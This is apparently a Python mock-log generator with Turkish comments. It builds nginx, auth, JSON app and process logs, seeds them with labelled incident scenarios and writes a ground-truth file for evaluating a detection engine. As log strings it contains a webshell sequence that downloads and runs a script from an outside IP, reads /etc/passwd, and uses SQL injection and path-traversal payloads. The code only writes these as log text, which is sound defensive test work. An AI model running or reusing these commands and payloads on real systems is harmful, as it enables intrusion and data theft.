"""Sahte (mock) log üreteci.

Dört kaynaktan gerçekçi ham log satırları üretir ve zaman çizelgesine senaryolar yerleştirir:
  web.log   nginx combined formatı
  auth.log  syslog (sshd, sudo, useradd)
  app.log   JSON uygulama logları (order-api)
  proc.log  süreç çalıştırma kayıtları (EDR/auditd benzeri)

Ayrıca iki dosya yazar:
  context.json       operatörün bildiği bağlam (yetkili tarayıcı, bakım/yedekleme penceresi) -> motor OKUR
  ground_truth.json  senaryoların gerçek etiketleri -> motor ASLA okumaz, yalnızca evaluate kullanır
"""
from __future__ import annotations

import json
import random
import time
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Callable

TZ = timezone(timedelta(hours=3))
START = datetime(2026, 10, 30, 9, 0, 0, tzinfo=TZ)
WARMUP_MINUTES = 10
SOURCES = ("web", "auth", "app", "proc")

USERS = ["ayse", "mehmet", "zeynep", "can", "elif", "burak", "deniz", "ece", "emre", "selin", "murat", "ceren"]
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
]
NORMAL_PATHS = [
    ("GET", "/", False), ("GET", "/products", False), ("GET", "/products/{pid}", False),
    ("GET", "/static/app.{h}.js", False), ("GET", "/api/cart", True), ("GET", "/api/users/me", True),
    ("GET", "/api/orders", True), ("POST", "/api/orders", True), ("POST", "/login", False),
    ("POST", "/api/checkout", True),
]


@dataclass
class Scenario:
    id: str
    label: str            # normal | dinamik_hata | imzasiz_saldiri | bilinen_saldiri
    minutes: int
    description: str
    fn: Callable
    decoy: bool = False   # şüpheli görünen ama meşru olay
    start: datetime | None = None
    end: datetime | None = None


class Emitter:
    def __init__(self, seed: int):
        self.rng = random.Random(seed)
        self.events: list[tuple[datetime, str, str]] = []
        self.pid = 4000
        ip_rng = random.Random(seed + 1)
        self.customer_ips = [f"{ip_rng.choice([78, 88, 95, 176, 212])}.{ip_rng.randint(1, 254)}."
                             f"{ip_rng.randint(1, 254)}.{ip_rng.randint(1, 254)}" for _ in range(60)]
        self.employee_ips = [f"10.0.1.{i}" for i in range(10, 40)]
        self.user_home_ip = {u: self.rng.choice(self.customer_ips) for u in USERS}

    def next_pid(self) -> int:
        self.pid += self.rng.randint(1, 30)
        return self.pid

    # --- satır biçimleyiciler ---
    def web(self, ts, ip, user, method, path, status, size, ua, rt):
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S %z")
        self.events.append((ts, "web", f'{ip} - {user} [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}" rt={rt:.3f}'))

    def auth(self, ts, prog, msg, host="web-01"):
        self.events.append((ts, "auth", f"{ts.isoformat()} {host} {prog}[{self.next_pid()}]: {msg}"))

    def app(self, ts, level, msg, service="order-api", **extra):
        rec = {"ts": ts.isoformat(timespec="milliseconds"), "level": level, "service": service, "host": "app-01", "msg": msg, **extra}
        self.events.append((ts, "app", json.dumps(rec, ensure_ascii=False)))

    def proc(self, ts, user, parent, exe, cmd, host="web-01"):
        pid = self.next_pid()
        self.events.append((ts, "proc", f'{ts.isoformat()} host={host} user={user} pid={pid} ppid={pid - self.rng.randint(1, 900)} '
                                        f'parent={parent} exe={exe} cmd="{cmd}"'))

    def jitter(self, base: datetime, seconds: float = 1.0) -> datetime:
        return base + timedelta(milliseconds=self.rng.randint(0, int(seconds * 1000) - 1))


def seconds(start: datetime, end: datetime):
    t = start
    while t < end:
        yield t
        t += timedelta(seconds=1)


# ---------------------------------------------------------------- normal trafik
def background(em: Emitter, start: datetime, end: datetime):
    r = em.rng
    # Geçmişte görülmüş rutin yönetici girişleri: baseline'ın bunları ısınma süresinde tanıması için
    for who, ip, minute in [("deploy", "10.0.1.5", 2), ("admin", "10.0.1.7", 5)]:
        t = start + timedelta(minutes=minute, seconds=17)
        em.auth(t, "sshd", f"Accepted publickey for {who} from {ip} port {r.randint(40000, 65000)} ssh2: ED25519 SHA256:k3Qx")
        em.proc(t + timedelta(seconds=1), who, "sshd", "/bin/bash", "-bash")
    for t in seconds(start, end):
        for _ in range(r.choices([1, 2, 3], [0.3, 0.45, 0.25])[0]):
            ts = em.jitter(t)
            method, path, needs_auth = r.choice(NORMAL_PATHS)
            path = path.format(pid=r.randint(100, 999), h=r.choice(["a81f", "c02d"]))
            user = r.choice(USERS) if needs_auth else "-"
            ip = em.user_home_ip[user] if user != "-" else r.choice(em.customer_ips + em.employee_ips[:5])
            status, size, rt = 200, r.randint(400, 18000), r.lognormvariate(-3.3, 0.5)
            if path == "/login":
                status, size = (401, 98) if r.random() < 0.03 else (200, 310)
            elif r.random() < 0.01:
                status, size = 404, 153
            elif r.random() < 0.002:
                status, size = 500, 210
            em.web(ts, ip, user, method, path, status, size, r.choice(BROWSER_UAS), rt)
            if method == "POST" and path == "/api/orders" and status == 200:
                em.app(ts, "INFO", "order created", order_id=r.randint(10**6, 10**7), user=user, latency_ms=int(rt * 1000))
            if path == "/api/checkout" and status == 200:
                em.app(ts, "INFO", "checkout completed", user=user, latency_ms=int(rt * 1000))
        if r.random() < 1 / 20:
            em.app(em.jitter(t), "WARN", "slow query", query="SELECT * FROM orders WHERE user_id=?", latency_ms=r.randint(800, 1600))
        if r.random() < 1 / 240:
            em.app(em.jitter(t), "ERROR", "payment gateway timeout", provider="iyzico", latency_ms=5000)
        if t.second == 0:
            em.auth(em.jitter(t), "CRON", "pam_unix(cron:session): session opened for user root(uid=0)")
            em.proc(em.jitter(t), "root", "cron", "/usr/bin/python3", "python3 /opt/jobs/metrics_push.py")
            if t.minute % 5 == 0:
                em.proc(em.jitter(t), "root", "cron", "/usr/bin/find", "find /var/tmp -mtime +7 -delete")
        if r.random() < 1 / 120:
            who, ip = r.choice([("deploy", "10.0.1.5"), ("admin", "10.0.1.7")])
            em.auth(em.jitter(t), "sshd", f"Accepted publickey for {who} from {ip} port {r.randint(40000, 65000)} ssh2: ED25519 SHA256:k3Qx")
            em.proc(em.jitter(t, 3), who, "sshd", "/bin/bash", "-bash")
            if who == "admin" and r.random() < 0.5:
                em.auth(em.jitter(t, 5), "sudo", f"{who} : TTY=pts/0 ; PWD=/home/{who} ; USER=root ; COMMAND=/usr/bin/systemctl status order-api")
        if r.random() < 1 / 600:
            u = r.choice(USERS)
            em.auth(em.jitter(t), "sshd", f"Failed password for {u} from {r.choice(em.employee_ips)} port {r.randint(40000, 65000)} ssh2")


# ---------------------------------------------------------------- dinamik hatalar
def db_pool_exhaustion(em: Emitter, start, end):
    r = em.rng
    total = (end - start).total_seconds()
    for t in seconds(start, end):
        p = min(1.0, 0.2 + (t - start).total_seconds() / total)
        if r.random() < p:
            ts = em.jitter(t)
            em.app(ts, "ERROR", "HikariPool-1 - Connection is not available, request timed out after 30000ms",
                   pool_active=20, pool_max=20, pool_waiting=r.randint(15, 60))
            u = r.choice(USERS)
            em.web(ts, em.user_home_ip[u], u, "GET", "/api/orders", 503, 190, r.choice(BROWSER_UAS), 30.0 + r.random())
        if t.second % 15 == 0:
            em.app(em.jitter(t), "WARN", "db-01 connection usage high", active=20, max=20, host_db="db-01")


def bad_deploy(em: Emitter, start, end):
    r = em.rng
    em.auth(start, "sshd", "Accepted publickey for deploy from 10.0.1.5 port 51022 ssh2: ED25519 SHA256:k3Qx")
    em.proc(start + timedelta(seconds=2), "deploy", "bash", "/usr/bin/sudo", "sudo systemctl restart order-api")
    em.auth(start + timedelta(seconds=2), "sudo", "deploy : TTY=pts/1 ; PWD=/opt/order-api ; USER=root ; COMMAND=/usr/bin/systemctl restart order-api")
    em.app(start + timedelta(seconds=5), "INFO", "order-api starting", version="2.4.1", commit="9f3c2e1")
    for t in seconds(start + timedelta(seconds=8), end):
        if r.random() < 0.6:
            ts, u = em.jitter(t), r.choice(USERS)
            em.web(ts, em.user_home_ip[u], u, "POST", "/api/checkout", 500, 230, r.choice(BROWSER_UAS), r.uniform(0.05, 0.2))
            em.app(ts, "ERROR", "Unhandled exception in POST /api/checkout",
                   exception="java.lang.NullPointerException: Cannot invoke \"Coupon.getRate()\" because \"coupon\" is null",
                   at="CheckoutService.applyCoupon(CheckoutService.java:214)", version="2.4.1", user=u)


def memory_leak_oom(em: Emitter, start, end):
    r = em.rng
    total = (end - start).total_seconds()
    crash = start + timedelta(seconds=total * 0.75)
    for t in seconds(start, crash):
        if t.second % 10 == 0:
            heap = 70 + int(28 * (t - start).total_seconds() / (crash - start).total_seconds())
            em.app(em.jitter(t), "WARN", "GC overhead high", heap_used_pct=heap, gc_pause_ms=r.randint(300, 2500))
        if r.random() < 0.3:
            u = r.choice(USERS)
            em.web(em.jitter(t), em.user_home_ip[u], u, "GET", "/api/orders", 200, r.randint(800, 4000), r.choice(BROWSER_UAS), r.uniform(1.5, 4.0))
    em.app(crash, "FATAL", "java.lang.OutOfMemoryError: Java heap space", heap_used_pct=99)
    em.proc(crash + timedelta(seconds=1), "root", "systemd", "/usr/bin/java", "java -Xmx2g -jar /opt/order-api/order-api.jar")
    em.app(crash + timedelta(seconds=20), "INFO", "order-api starting", version="2.4.1", commit="9f3c2e1")
    for t in seconds(crash, crash + timedelta(seconds=20)):
        for _ in range(2):
            u = r.choice(USERS)
            em.web(em.jitter(t), em.user_home_ip[u], u, "GET", "/api/orders", 502, 166, r.choice(BROWSER_UAS), 0.001)


# ---------------------------------------------------------------- imzasız saldırılar
def credential_stuffing(em: Emitter, start, end):
    """Dağıtık, yavaş deneme: hiçbir IP eşiği aşmaz, imza yok."""
    r = em.rng
    ips = [f"{r.choice([31, 46, 85, 185, 193])}.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)}" for _ in range(70)]
    targets = USERS + [f"{u}@example.com" for u in USERS]
    for t in seconds(start, end):
        if r.random() < 0.55:
            em.web(em.jitter(t), r.choice(ips), "-", "POST", "/login", 401, 98, r.choice(BROWSER_UAS), r.uniform(0.08, 0.2))
    win_ip, t = r.choice(ips), end - timedelta(seconds=40)
    em.web(t, win_ip, "-", "POST", "/login", 200, 310, BROWSER_UAS[0], 0.11)
    for i, path in enumerate(["/api/users/me", "/api/payment-methods", "/api/users/me/addresses", "/api/orders"]):
        em.web(t + timedelta(seconds=3 + 4 * i), win_ip, "ece", "GET", path, 200, r.randint(600, 3000), BROWSER_UAS[0], 0.05)


def webshell(em: Emitter, start, end):
    r, ip, ua = em.rng, "45.142.212.33", BROWSER_UAS[3]
    shell = "/uploads/avatars/a1b2c3.php"
    em.web(start + timedelta(seconds=5), ip, "-", "POST", "/api/profile/avatar", 200, 88, ua, 0.21)
    cmds = [("id", "/usr/bin/id"), ("uname -a", "/usr/bin/uname"), ("cat /etc/passwd", "/usr/bin/cat"),
            ("curl -s http://45.142.212.33:8080/x.sh -o /tmp/.x", "/usr/bin/curl"), ("chmod +x /tmp/.x", "/usr/bin/chmod"),
            ("/tmp/.x", "/tmp/.x"), ("crontab -l", "/usr/bin/crontab")]
    t = start + timedelta(seconds=40)
    for cmd, exe in cmds:
        em.web(t, ip, "-", "GET", f"{shell}?c={cmd.split()[0].split('/')[-1]}", 200, r.randint(40, 900), ua, 0.03)
        em.proc(t + timedelta(milliseconds=30), "www-data", "php-fpm", "/bin/sh", f"sh -c {cmd}")
        em.proc(t + timedelta(milliseconds=60), "www-data", "sh", exe, cmd)
        t += timedelta(seconds=r.randint(10, 25))


def idor_enumeration(em: Emitter, start, end):
    r, user = em.rng, "can"
    ip, uid = em.user_home_ip[user], 1000
    for t in seconds(start, end):
        for _ in range(2):
            em.web(em.jitter(t), ip, user, "GET", f"/api/users/{uid}/profile", 200, r.randint(700, 950), BROWSER_UAS[0], 0.04)
            uid += 1


def data_exfiltration(em: Emitter, start, end):
    r, ip, ua = em.rng, "103.75.190.12", "python-requests/2.31.0"
    em.web(start, ip, "-", "POST", "/login", 200, 310, ua, 0.1)
    page = 1
    for t in seconds(start + timedelta(seconds=3), end):
        if r.random() < 0.8:
            em.web(em.jitter(t), ip, "deniz", "GET", f"/api/export/customers?page={page}&size=500", 200,
                   r.randint(1_400_000, 1_700_000), ua, r.uniform(0.6, 1.2))
            page += 1


# ---------------------------------------------------------------- bilinen (imzalı) saldırılar
def sqli_scan(em: Emitter, start, end):
    r, ip, ua = em.rng, "185.220.101.47", "sqlmap/1.7.2#stable (https://sqlmap.org)"
    payloads = ["/search?q=1%27%20OR%201%3D1--", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "/products?id=1%20AND%20SLEEP(5)", "/search?q=%27%29%3B%20DROP%20TABLE%20orders--",
                "/download?file=../../../../etc/passwd"]
    for t in seconds(start, end):
        for _ in range(3):
            p = r.choice(payloads)
            status = r.choice([500, 400, 404, 200])
            em.web(em.jitter(t), ip, "-", "GET", p, status, r.randint(150, 900), ua, r.uniform(0.02, 5.1))
            if status == 500:
                em.app(em.jitter(t), "ERROR", "SQL syntax error", detail="You have an error in your SQL syntax near ''' at line 1")


def ssh_bruteforce(em: Emitter, start, end):
    r, ip = em.rng, "218.92.0.112"
    for t in seconds(start, end):
        for _ in range(4):
            user = r.choice(["root", "root", "admin", "oracle", "test", "ubuntu"])
            port = r.randint(30000, 65000)
            if user in ("oracle", "test", "ubuntu"):
                em.auth(em.jitter(t), "sshd", f"Invalid user {user} from {ip} port {port}")
            em.auth(em.jitter(t), "sshd", f"Failed password for {'invalid user ' if user in ('oracle', 'test', 'ubuntu') else ''}{user} from {ip} port {port} ssh2")


# ---------------------------------------------------------------- yanıltıcı ama meşru (decoy)
def authorized_scanner(em: Emitter, start, end):
    r, ip, ua = em.rng, "10.0.5.50", "Mozilla/5.0 (compatible; Nessus SOAP)"
    paths = ["/admin", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/server-status", "/.env", "/backup.zip", "/api/v1/debug"]
    for t in seconds(start, end):
        for _ in range(3):
            em.web(em.jitter(t), ip, "-", "GET", r.choice(paths) + f"?s={r.randint(1, 9999)}", r.choice([404, 404, 403]), 153, ua, 0.01)


def scheduled_backup(em: Emitter, start, end):
    r, ip, ua = em.rng, "10.0.9.10", "backup-agent/3.2"
    em.proc(start, "svc-backup", "cron", "/usr/bin/pg_dump", "pg_dump -h db-01 -Fc shop -f /backup/shop.dump")
    page = 1
    for t in seconds(start + timedelta(seconds=5), end):
        if r.random() < 0.8:
            em.web(em.jitter(t), ip, "svc-backup", "GET", f"/api/export/customers?page={page}&size=500", 200,
                   r.randint(1_400_000, 1_700_000), ua, r.uniform(0.6, 1.2))
            page += 1
    em.proc(end - timedelta(seconds=5), "svc-backup", "cron", "/usr/bin/tar", "tar czf /backup/export.tgz /backup/tmp")


SCENARIOS = [
    Scenario("db_pool", "dinamik_hata", 3, "Veritabanı bağlantı havuzu tükendi, 503 ve zaman aşımları", db_pool_exhaustion),
    Scenario("sqli_scan", "bilinen_saldiri", 2, "sqlmap ile SQL injection / path traversal taraması", sqli_scan),
    Scenario("cred_stuffing", "imzasiz_saldiri", 4, "70 farklı IP'den yavaş, dağıtık parola deneme; sonunda bir hesap ele geçirildi", credential_stuffing),
    Scenario("scanner", "normal", 3, "Yetkili iç zafiyet taraması (decoy)", authorized_scanner, decoy=True),
    Scenario("bad_deploy", "dinamik_hata", 3, "2.4.1 sürümü sonrası checkout'ta NullPointerException", bad_deploy),
    Scenario("webshell", "imzasiz_saldiri", 3, "Avatar yüklemesiyle webshell, www-data altında komut çalıştırma", webshell),
    Scenario("idor", "imzasiz_saldiri", 3, "Meşru kullanıcı başka kullanıcıların profillerini sırayla çekiyor (IDOR)", idor_enumeration),
    Scenario("memleak", "dinamik_hata", 3, "Bellek sızıntısı, OutOfMemoryError ve servis yeniden başlatma", memory_leak_oom),
    Scenario("exfil", "imzasiz_saldiri", 3, "Ele geçirilmiş hesapla yeni IP'den toplu müşteri verisi indirme", data_exfiltration),
    Scenario("ssh_brute", "bilinen_saldiri", 2, "Tek IP'den klasik SSH brute force", ssh_bruteforce),
    Scenario("backup", "normal", 3, "Planlı gece yedeği: toplu export (decoy)", scheduled_backup, decoy=True),
]


def build_timeline(seed: int = 7) -> tuple[list[tuple[datetime, str, str]], list[Scenario], dict]:
    em = Emitter(seed)
    t = START + timedelta(minutes=WARMUP_MINUTES + 1)
    for sc in SCENARIOS:
        sc.start, sc.end = t, t + timedelta(minutes=sc.minutes)
        t = sc.end + timedelta(minutes=1)
    end = t + timedelta(minutes=1)

    background(em, START, end)
    for sc in SCENARIOS:
        sc.fn(em, sc.start, sc.end)
    em.events.sort(key=lambda e: e[0])

    scanner = next(s for s in SCENARIOS if s.id == "scanner")
    backup = next(s for s in SCENARIOS if s.id == "backup")
    context = {
        "environment": "E-ticaret platformu: web-01 (nginx + php-fpm), app-01 (order-api, Java), db-01 (PostgreSQL)",
        "internal_networks": ["10.0.0.0/8"],
        "authorized_activity": [
            {"what": "Nessus iç zafiyet taraması", "source_ip": "10.0.5.50",
             "window": [scanner.start.isoformat(), scanner.end.isoformat()]},
            {"what": "Planlı yedekleme: svc-backup hesabı müşteri verisini export API'si ile çeker",
             "source_ip": "10.0.9.10", "window": [backup.start.isoformat(), backup.end.isoformat()]},
        ],
        "service_accounts": ["deploy", "admin", "svc-backup", "www-data"],
        "notes": "Normal kullanıcılar yalnızca kendi profillerine (/api/users/me) erişir.",
    }
    return em.events, SCENARIOS, context


def write(out_dir: str | Path, seed: int = 7, live: bool = False, speed: float = 10.0):
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    events, scenarios, context = build_timeline(seed)
    (out / "context.json").write_text(json.dumps(context, ensure_ascii=False, indent=2), encoding="utf-8")
    truth = [{"id": s.id, "label": s.label, "decoy": s.decoy, "description": s.description,
              "start": s.start.isoformat(), "end": s.end.isoformat()} for s in scenarios]
    (out / "ground_truth.json").write_text(json.dumps(truth, ensure_ascii=False, indent=2), encoding="utf-8")

    files = {s: open(out / f"{s}.log", "w", encoding="utf-8", newline="\n") for s in SOURCES}
    try:
        t0, wall0 = events[0][0], time.monotonic()
        for ts, source, line in events:
            if live:
                delay = (ts - t0).total_seconds() / speed - (time.monotonic() - wall0)
                if delay > 0:
                    time.sleep(delay)
            files[source].write(line + "\n")
            if live:
                files[source].flush()
    finally:
        for f in files.values():
            f.close()
    return len(events), events[0][0], events[-1][0]
